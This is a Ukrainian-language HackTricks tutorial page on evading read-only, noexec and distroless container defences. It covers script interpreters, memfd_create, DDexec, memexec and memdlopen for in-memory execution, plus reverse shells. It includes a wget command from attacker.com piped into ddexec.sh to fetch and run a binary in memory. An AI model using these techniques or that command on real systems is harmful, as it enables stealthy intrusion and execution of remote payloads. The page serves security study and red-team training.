# Обхід захистів FS: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Відео

У наступних відео детальніше пояснюються техніки, згадані на цій сторінці:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Дослідження маніпуляцій із пам'яттю Linux для приховування та обходу засобів виявлення**](https://www.youtube.com/watch?v=poHirez8jk4).<sup>[[1]](#references)</sup>
- [**Приховані вторгнення за допомогою DDexec-ng та dlopen() у пам'яті - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU).<sup>[[2]](#references)</sup>

## сценарій read-only / no-exec

У контейнері можна змонтувати кореневу файлову систему в режимі read-only, задавши **`readOnlyRootFilesystem: true`** у контексті безпеки.<sup>[[3]](#references)</sup> Наприклад:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Read-only коренева файлова система не робить окремо змонтовані томи read-only. Docker розглядає **`/dev/shm`** як IPC-монтування, тоді як параметри tmpfs, такі як `rw` і `noexec`, є налаштуваннями runtime; перевірте параметри монтування цільового контейнера, перш ніж покладатися на будь-яку з цих властивостей.<sup>[[4]](#references)[[5]](#references)</sup>

> [!WARNING]
> З погляду red-team, таке поєднання може ускладнити завантаження та виконання бінарних файлів, яких ще немає в системі (наприклад, backdoors або інструментів enumeration).<sup>[[4]](#references)[[5]](#references)</sup>

## Найпростіший обхід: Scripts

Монтування `noexec` блокує пряме виконання бінарних файлів із цього монтування, але interpreter все одно може прочитати й інтерпретувати script. Тому, якщо доступний `sh` або `python`, можна запустити shell- або Python-script через відповідний interpreter.<sup>[[5]](#references)</sup>

Це не допоможе, якщо потрібний інструмент сам є бінарним файлом.<sup>[[5]](#references)</sup>

## Обходи через пам'ять

Якщо пряме виконання зі змонтованого шляху заблоковане, одним із варіантів є завантаження ELF у пам'ять і його виконання через шлях у пам'яті. Це обходить перевірку `noexec` для цього монтування, але не усуває інші обмеження ядра, дозволів або політик.<sup>[[5]](#references)[[6]](#references)</sup>

### Обхід через FD + exec syscall

Якщо scripting runtime може отримати доступ до відповідного Linux interface, він може створити анонімний файловий дескриптор у RAM за допомогою **`memfd_create(2)`**, записати в нього байти ELF і використати шлях виконання, що працює через fd. Проєкт [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec) генерує стиснений і закодований у base64 Python-, Perl- або Ruby-код для цього workflow.<sup>[[6]](#references)[[7]](#references)</sup>

Наразі проєкт документує targets для Python, Perl і Ruby; для PHP або Node потрібна інша runtime-specific техніка або extension, тому відсутність цього generator для певної мови не означає, що виконання в пам'яті неможливе.<sup>[[6]](#references)[[12]](#references)</sup>

> [!WARNING]
> Звичайний executable, записаний у **`/dev/shm`**, усе одно підпадає під дію параметра **`noexec`** цього монтування; просте відкриття його через звичайний файловий дескриптор не змінює політику монтування.<sup>[[5]](#references)</sup>
>
> Конкретний метод виконання в пам'яті також залежить від runtime, architecture, kernel і доступних permissions.<sup>[[6]](#references)[[7]](#references)[[12]](#references)</sup>

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) записує stager і loader у процес shell, що виконується, через **`/proc/self/mem`**, а потім передає керування цьому коду.<sup>[[8]](#references)</sup>

Це дає процесу змогу завантажити наданий бінарний файл, не розміщуючи його спочатку у файловій системі, придатній для виконання.<sup>[[8]](#references)</sup>

> [!TIP]
> **DDexec / EverythingExec** може завантажувати та **виконувати** shellcode або бінарний файл із **пам'яті**.<sup>[[8]](#references)</sup>
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Для отримання додаткової інформації про цю техніку перегляньте Github або:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) — це daemonized реалізація DDexec. Її daemon прослуховує запити, що містять аргументи та raw байти програм, створює дочірній процес для завантаження й запуску кожної програми, а батьківський процес залишає як server.<sup>[[9]](#references)</sup>

Репозиторій містить приклад використання **memexec для виконання бінарних файлів із PHP reverse shell** у [a.php](https://github.com/arget13/memexec/blob/main/a.php).<sup>[[9]](#references)</sup>

### Memdlopen

Маючи подібне призначення до DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) — це fileless реалізація `dlopen()` для shared object або програми. У його README наразі задокументовано підтримку ARM64, тому перед використанням перевірте архітектуру цільової системи.<sup>[[10]](#references)</sup>

## Distroless Bypass

Щоб отримати спеціальне пояснення **того, чим насправді є distroless**, коли він допомагає, коли ні та як він змінює post-exploitation tradecraft у контейнерах, перегляньте:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Що таке distroless

Distroless images містять лише застосунок і його runtime dependencies; офіційні images не містять package managers, shells та інших програм, очікуваних у стандартному Linux distribution.<sup>[[11]](#references)</sup>

Обмеження runtime image цими залежностями зменшує кількість software, присутнього у production, а також обсяг того, що потрібно сканувати й відстежувати.<sup>[[11]](#references)</sup>

### Reverse Shell

У distroless container ви можете **не знайти `sh` або `bash`** для звичайного shell, а також поширені utilities, такі як `ls`, `whoami` або `id`.<sup>[[11]](#references)</sup>

> [!WARNING]
> Тому звичайний shell-based reverse shell або utility-based enumeration може не працювати.<sup>[[11]](#references)</sup>

Якщо compromised application містить language runtime (наприклад, Python для Flask application або Node.js для Node application), RCE все ще може використовувати цей runtime для command channel та system inspection через його APIs.<sup>[[11]](#references)[[12]](#references)</sup>

> [!TIP]
> Використовуйте доступну scripting language, щоб **enumerate system** через її language capabilities.<sup>[[12]](#references)</sup>

Якщо немає **read-only/no-exec** protections, command channel може записувати binaries у writable, executable mount і запускати їх; спочатку перевірте mount options та permissions.<sup>[[4]](#references)[[5]](#references)</sup>

> [!TIP]
> Коли ці protections присутні, використовуйте наведені вище **memory-execution techniques**, якщо це дозволяють runtime, kernel і permissions.<sup>[[6]](#references)[[8]](#references)[[10]](#references)</sup>

Приклади використання RCE vulnerabilities для отримання scripting-language **reverse shells** і виконання binaries з memory можна знайти в [**DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).<sup>[[12]](#references)</sup>

## References

- [1] [DEF CON 31 - Дослідження маніпуляцій із пам’яттю Linux для приховування та обходу засобів виявлення](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Приховані intrusion за допомогою DDexec-ng та in-memory dlopen() - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)
- [3] [Налаштування Security Context для Pod або Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [4] [docker container run](https://docs.docker.com/reference/cli/docker/container/run)
- [5] [mount(8) - сторінка посібника Linux](https://man7.org/linux/man-pages/man8/mount.8.html)
- [6] [fileless-elf-exec](https://github.com/nnsee/fileless-elf-exec)
- [7] [memfd_create(2) - сторінка посібника Linux](https://man7.org/linux/man-pages/man2/memfd_create.2.html)
- [8] [DDexec](https://github.com/arget13/DDexec)
- [9] [memexec](https://github.com/arget13/memexec)
- [10] [memdlopen](https://github.com/arget13/memdlopen)
- [11] [GoogleContainerTools/distroless](https://github.com/GoogleContainerTools/distroless)
- [12] [DistrolessRCE](https://github.com/carlospolop/DistrolessRCE)
{{#include ../../../../banners/hacktricks-training.md}}
